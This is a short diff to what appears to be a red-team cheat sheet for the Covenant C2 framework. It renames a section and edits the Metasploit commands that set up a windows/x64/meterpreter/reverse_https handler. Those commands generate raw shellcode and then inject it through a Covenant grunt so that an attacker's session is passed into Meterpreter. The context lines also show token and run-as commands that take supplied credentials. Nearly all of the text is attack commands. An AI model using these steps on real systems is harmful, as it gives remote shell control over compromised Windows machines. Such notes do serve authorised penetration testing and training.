@@ -88,7 +88,8 @@ MakeToken /username:"<USER>" /domain:"<DOMAIN>" /password:"<PASSWORD>" /logontyp
 ShellRunAs /shellcommand:"whoami" /username:"<USERNAME>" /domain:"<DOMAIN>" /password:"<PASSWORD>"
 ```
 
-#### Passing session to metasploit
+
+#### Covenant --> Meterpreter
 ```
 use exploit/multi/handler
 setg payload windows/x64/meterpreter/reverse_https
@@ -98,7 +99,8 @@ setg exitfunc thread
 setg exitonsession false
 run -j
 
-use payload/windows/x64/meterpreter/reverse_https
-generate -f raw -o /tmp/sc.bin
+# Generate payload
+payload windows/x64/meterpreter/reverse_https
+generate -f raw > /tmp/payload.bin
 ```
 - Go to covenant, select grun --> task --> Shellcode and choose the file
